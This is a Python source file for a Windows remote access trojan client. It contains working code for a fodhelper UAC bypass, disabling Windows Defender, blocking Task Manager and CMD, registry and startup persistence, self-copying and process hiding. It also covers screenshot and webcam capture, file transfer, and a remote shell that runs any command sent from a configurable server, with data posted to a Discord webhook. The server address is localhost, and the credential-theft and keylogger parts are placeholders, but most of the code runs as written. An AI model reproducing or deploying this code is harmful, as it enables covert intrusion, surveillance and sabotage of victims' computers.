import os
import sys
import shutil
import subprocess
import winreg
import socket
import threading
import time
import requests
import getpass
import win32api
import win32process
import ctypes
import pyautogui
import cv2
import io
from PIL import Image
from datetime import datetime
from cryptography.fernet import Fernet


try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False


SERVER_PUBLIC_IP_OR_DOMAIN = "127.0.0.1"  
REMOTE_PORT = 8080
DISCORD_WEBHOOK = "dont use this"  
BUFFER_SIZE = 1024 * 1024
ENCRYPTION_KEY = Fernet.generate_key()
cipher_suite = Fernet(ENCRYPTION_KEY)
DNS_SERVERS = ['8.8.8.8', '1.1.1.1', '127.0.0.1'] if DNS_AVAILABLE else []


CURRENT_PATH = os.path.abspath(sys.argv[0])
STARTUP_PATH = os.path.join(os.getenv('APPDATA', ''), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup', 'system_svc.exe')
REGISTRY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
HIDDEN_NAME = "system_svc"
LOG_FILE = os.path.join(os.getenv('APPDATA', ''), 'syslog.txt')
TEMP_DIR = os.path.join(os.getenv('TEMP', ''), 'client_temp')
KEYLOG_FILE = os.path.join(os.getenv('APPDATA', ''), 'keylog.txt')


screen_watch_active = False
keylog_active = False


if not os.path.exists(TEMP_DIR):
    try:
        os.makedirs(TEMP_DIR)
    except Exception as e:
        print(f"Failed to create temp dir: {str(e)}")

def log_message(message):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"[{datetime.now()}] {message}\n")
    except Exception:
        pass

def resolve_domain(domain):
    if not DNS_AVAILABLE:
        log_message("DNS module not available, skipping resolution.")
        return SERVER_PUBLIC_IP_OR_DOMAIN
    for dns_server in DNS_SERVERS:
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [dns_server]
            answers = resolver.resolve(domain, 'A')
            for rdata in answers:
                log_message(f"Resolved {domain} to {rdata} using DNS {dns_server}")
                return str(rdata)
        except Exception as e:
            log_message(f"Failed to resolve {domain} with DNS {dns_server}: {str(e)}")
            continue
    log_message(f"Failed to resolve {domain} with all DNS servers")
    return None

def uac_bypass():
    try:
        
        log_message("Attempting UAC bypass via fodhelper.exe method.")
        
        reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'cmd.exe /c start "" "{sys.executable}" "{CURRENT_PATH}"')
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        
        subprocess.run(['fodhelper.exe'], shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
        log_message("UAC bypass attempted via fodhelper.exe. Waiting for elevation.")
        time.sleep(3)
        if ctypes.windll.shell32.IsUserAnAdmin():
            log_message("UAC bypass successful via fodhelper.exe.")
          
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
            except:
                pass
            return True
        else:
    
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
            except:
                pass
            log_message("UAC bypass failed: Elevation not achieved.")
            return False
    except Exception as e:
        log_message(f"UAC bypass failed via fodhelper.exe: {str(e)}")
        return False

def hide_process():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        handle = win32process.GetCurrentProcess()
        win32process.SetPriorityClass(handle, win32process.IDLE_PRIORITY_CLASS)
        try:
            ctypes.windll.kernel32.SetConsoleTitleW("System Idle Process")
        except:
            pass
        log_message("Process hidden successfully.")
        return "Process hidden."
    except Exception as e:
        log_message(f"Failed to hide process: {str(e)}")
        return f"Failed to hide process: {str(e)}"

def disable_defender():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'], shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run(['powershell', '-Command', 'Uninstall-WindowsFeature -Name Windows-Defender'], shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            log_message("Windows Defender disabled.")
            return "Windows Defender disabled."
        else:
            log_message("Skipping Defender disable: Not running as admin.")
            return "Skipping Defender disable: Not running as admin."
    except Exception as e:
        log_message(f"Failed to disable Defender: {str(e)}")
        return f"Failed to disable Defender: {str(e)}"

def disable_system_tools():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            log_message("Task Manager and CMD disabled.")
            return "Task Manager and CMD disabled."
        else:
            log_message("Skipping system tools disable: Not running as admin.")
            return "Skipping system tools disable: Not running as admin."
    except Exception as e:
        log_message(f"Failed to disable tools: {str(e)}")
        return f"Failed to disable tools: {str(e)}"

def add_to_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REGISTRY_PATH, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, HIDDEN_NAME, 0, winreg.REG_SZ, STARTUP_PATH)
        winreg.CloseKey(key)
        if not os.path.exists(STARTUP_PATH):
            shutil.copy2(CURRENT_PATH, STARTUP_PATH)
        log_message("Added to startup.")
        return "Added to startup."
    except Exception as e:
        log_message(f"Failed to add to startup: {str(e)}")
        return f"Failed to add to startup: {str(e)}"

def hide_in_registry():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"System\CurrentControlSet\Services", 0, winreg.KEY_CREATE_SUB_KEY)
            new_key = winreg.CreateKey(key, HIDDEN_NAME)
            winreg.SetValueEx(new_key, "DisplayName", 0, winreg.REG_SZ, "System Service")
            winreg.SetValueEx(new_key, "ImagePath", 0, winreg.REG_SZ, STARTUP_PATH)
            winreg.CloseKey(new_key)
            winreg.CloseKey(key)
            log_message("Hidden in registry.")
            return "Hidden in registry."
        else:
            log_message("Skipping registry hide: Not running as admin.")
            return "Skipping registry hide: Not running as admin."
    except Exception as e:
        log_message(f"Failed to hide in registry: {str(e)}")
        return f"Failed to hide in registry: {str(e)}"

def self_replicate():
    try:
        common_paths = [
            os.path.join(os.getenv('APPDATA', ''), 'Roaming', 'system_svc.exe'),
            os.path.join(os.getenv('PROGRAMDATA', ''), 'system_svc.exe')
        ]
        for path in common_paths:
            if not os.path.exists(path):
                shutil.copy2(CURRENT_PATH, path)
        log_message("Self-replicated to common paths.")
        return "Self-replicated to common paths."
    except Exception as e:
        log_message(f"Failed to replicate: {str(e)}")
        return f"Failed to replicate: {str(e)}"

def steal_credentials():
    try:
        username = getpass.getuser()
        stolen_data = f"Username: {username}\nTimestamp: {datetime.now()}\n"
        stolen_data += "Browser Cookies: [Placeholder for actual theft]\n"
        encrypted_data = cipher_suite.encrypt(stolen_data.encode()).decode()
        log_message("Credentials stolen and encrypted.")
        return encrypted_data
    except Exception as e:
        log_message(f"Credential theft failed: {str(e)}")
        return cipher_suite.encrypt(f"Credential theft failed: {str(e)}".encode()).decode()

def send_to_discord(data):
    try:
        payload = {"content": f"Stolen Data:\n{data}"}
        requests.post(DISCORD_WEBHOOK, json=payload)
        log_message("Data sent to Discord.")
        return "Data sent to Discord."
    except Exception as e:
        log_message(f"Failed to send to Discord: {str(e)}")
        return f"Failed to send to Discord: {str(e)}"

def capture_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_data = img_byte_arr.getvalue()
        log_message("Screenshot captured.")
        return img_data
    except Exception as e:
        log_message(f"Screenshot failed: {str(e)}")
        return None

def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            log_message("Webcam not available.")
            return None
        ret, frame = cap.read()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame)
            img_data = buffer.tobytes()
            log_message("Webcam photo captured.")
            cap.release()
            return img_data
        cap.release()
        log_message("Webcam capture failed.")
        return None
    except Exception as e:
        log_message(f"Webcam capture failed: {str(e)}")
        return None

def keylogger_start():
    global keylog_active
    keylog_active = True
    log_message("Keylogger started.")
    return "Keylogger started. (Placeholder - actual keylogging not implemented)"

def keylogger_stop():
    global keylog_active
    keylog_active = False
    log_message("Keylogger stopped.")
    return "Keylogger stopped."

def keylogger_get():
    try:
        if os.path.exists(KEYLOG_FILE):
            with open(KEYLOG_FILE, 'r') as f:
                logs = f.read()
            log_message("Keylogger logs retrieved.")
            return logs if logs else "No keylog data available."
        return "No keylog file found."
    except Exception as e:
        log_message(f"Failed to get keylogger logs: {str(e)}")
        return f"Failed to get keylogger logs: {str(e)}"

def handle_download(client, filepath):
    try:
        if os.path.exists(filepath):
            file_size = os.path.getsize(filepath)
            client.send(str(file_size).encode())
            with open(filepath, 'rb') as f:
                while True:
                    data = f.read(BUFFER_SIZE)
                    if not data:
                        break
                    client.send(data)
            log_message(f"File {filepath} sent to server.")
            return f"File {filepath} sent successfully."
        else:
            client.send(str(-1).encode())
            log_message(f"File {filepath} not found for download.")
            return f"File {filepath} not found."
    except Exception as e:
        try:
            client.send(str(-1).encode())
        except:
            pass
        log_message(f"Download failed for {filepath}: {str(e)}")
        return f"Download failed: {str(e)}"

def handle_upload(client, filepath):
    try:
        file_size = int(client.recv(1024).decode())
        if file_size == -1:
            log_message("Upload canceled: File not found on server.")
            return "Upload canceled: File not found on server."
        save_path = os.path.join(TEMP_DIR, os.path.basename(filepath))
        with open(save_path, 'wb') as f:
            received = 0
            while received < file_size:
                data = client.recv(BUFFER_SIZE)
                f.write(data)
                received += len(data)
        log_message(f"File uploaded to {save_path}.")
        return f"File uploaded to {save_path}."
    except Exception as e:
        log_message(f"Upload failed: {str(e)}")
        return f"Upload failed: {str(e)}"

def screen_watch(client, interval=2, duration=60):
    global screen_watch_active
    screen_watch_active = True
    start_time = time.time()
    log_message(f"Screen Watch started with interval {interval}s for {duration}s.")
    
    while screen_watch_active and (time.time() - start_time) < duration:
        try:
            img_data = capture_screenshot()
            if img_data:
                client.send(str(len(img_data)).encode())
                client.send(img_data)
                log_message("Screen Watch frame sent to server.")
            else:
                client.send(str(-1).encode())
                log_message("Screen Watch frame capture failed.")
            time.sleep(interval)
        except Exception as e:
            log_message(f"Screen Watch error: {str(e)}")
            try:
                client.send(str(-1).encode())
            except:
                pass
            break
    
    screen_watch_active = False
    log_message("Screen Watch stopped.")
    try:
        client.send(str(-1).encode())
    except:
        pass

def screen_watch_stop():
    global screen_watch_active
    screen_watch_active = False
    log_message("Screen Watch stop command received.")
    return "Screen Watch stopped."

def connect_to_server():
    retry_count = 0
    max_retries = 30
    while True:
        try:
            log_message("Creating socket for connection attempt...")
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(30)
            log_message("Starting DNS resolution for server domain...")
            server_ip = resolve_domain(SERVER_PUBLIC_IP_OR_DOMAIN) if SERVER_PUBLIC_IP_OR_DOMAIN != "127.0.0.1" and DNS_AVAILABLE else SERVER_PUBLIC_IP_OR_DOMAIN
            if not server_ip:
                log_message("DNS resolution failed. No IP returned for domain.")
                raise Exception("Failed to resolve server IP with all DNS servers")
            
            target = (server_ip, REMOTE_PORT)
            log_message(f"Resolved IP: {server_ip}. Attempting to connect to {server_ip}:{REMOTE_PORT}")
            client.connect(target)
            log_message(f"Connection successful to {server_ip}:{REMOTE_PORT}")
            client.send(f"Client connected from {socket.gethostname()}".encode())
            retry_count = 0
            
            while True:
                try:
                    log_message("Waiting for command from server...")
                    command = client.recv(1024).decode(errors='ignore')
                    if not command:
                        log_message("Empty command received or server disconnected.")
                        break
                    log_message(f"Received command: {command}")
                    if command.lower() == 'exit':
                        log_message("Received exit command from server.")
                        break
                    elif command == "screenshot":
                        log_message("Processing screenshot command...")
                        img_data = capture_screenshot()
                        if img_data:
                            client.send(str(len(img_data)).encode())
                            client.send(img_data)
                            log_message("Screenshot data sent to server.")
                        else:
                            client.send(str(-1).encode())
                            log_message("Screenshot capture failed. Sent error code.")
                    elif command == "webcam_capture":
                        log_message("Processing webcam capture command...")
                        img_data = capture_webcam()
                        if img_data:
                            client.send(str(len(img_data)).encode())
                            client.send(img_data)
                            log_message("Webcam data sent to server.")
                        else:
                            client.send(str(-1).encode())
                            log_message("Webcam capture failed. Sent error code.")
                    elif command == "keylogger_start":
                        response = keylogger_start()
                        client.send(response.encode())
                        log_message("Keylogger start response sent.")
                    elif command == "keylogger_stop":
                        response = keylogger_stop()
                        client.send(response.encode())
                        log_message("Keylogger stop response sent.")
                    elif command == "keylogger_get":
                        response = keylogger_get()
                        client.send(response.encode())
                        log_message("Keylogger logs sent.")
                    elif command == "screen_watch_start":
                        log_message("Starting Screen Watch...")
                        threading.Thread(target=screen_watch, args=(client, 2, 60)).start()
                        client.send("Screen Watch started.".encode())
                        log_message("Screen Watch start response sent.")
                    elif command == "screen_watch_stop":
                        response = screen_watch_stop()
                        client.send(response.encode())
                        log_message("Screen Watch stop response sent.")
                    elif command.startswith("download "):
                        filepath = command.split(" ", 1)[1]
                        log_message(f"Processing download request for {filepath}")
                        response = handle_download(client, filepath)
                        if not response.startswith("File") or "not found" in response or "failed" in response:
                            client.send(response.encode())
                            log_message(f"Download response sent: {response}")
                    elif command.startswith("upload "):
                        filepath = command.split(" ", 1)[1]
                        log_message(f"Processing upload request for {filepath}")
                        response = handle_upload(client, filepath)
                        client.send(response.encode())
                        log_message(f"Upload response sent: {response}")
                    else:
                        log_message(f"Executing shell command: {command}")
                        try:
                            result = subprocess.run(command, shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                            response = result.stdout + result.stderr
                        except Exception as e:
                            response = f"Command execution failed: {str(e)}"
                        client.send(response.encode())
                        log_message("Shell command response sent to server.")
                except Exception as e:
                    log_message(f"Error receiving command: {str(e)}")
                    break
            client.close()
            log_message("Connection to server closed normally.")
            time.sleep(10)
        except Exception as e:
            retry_count += 1
            log_message(f"Connection attempt failed (Attempt {retry_count}/{max_retries}): {str(e)}")
            if retry_count >= max_retries:
                log_message("Max retries reached. Waiting 120 seconds before retrying...")
                time.sleep(120)
                retry_count = 0
            else:
                time.sleep(15)
            continue

def main():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        log_message("Not running as admin. Attempting UAC bypass.")
        if uac_bypass():
            log_message("UAC bypass successful. Restarting script with elevated privileges.")
            sys.exit(0)
        else:
            log_message("UAC bypass failed. Continuing without elevated privileges.")
    else:
        log_message("Already running as admin. No UAC bypass needed.")

    threading.Thread(target=hide_process).start()
    
    tasks = [
        disable_defender,
        disable_system_tools,
        add_to_startup,
        hide_in_registry,
        self_replicate
    ]
    
    for task in tasks:
        threading.Thread(target=task).start()
    
    stolen_data = steal_credentials()
    threading.Thread(target=send_to_discord, args=(stolen_data,)).start()
    
    threading.Thread(target=connect_to_server, daemon=True).start()
    
    while True:
        time.sleep(1000)

if __name__ == "__main__":
    try:
        win32api.SetConsoleCtrlHandler(lambda x: True, True)
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        main()
    except Exception as e:
        log_message(f"Main execution failed: {str(e)}")
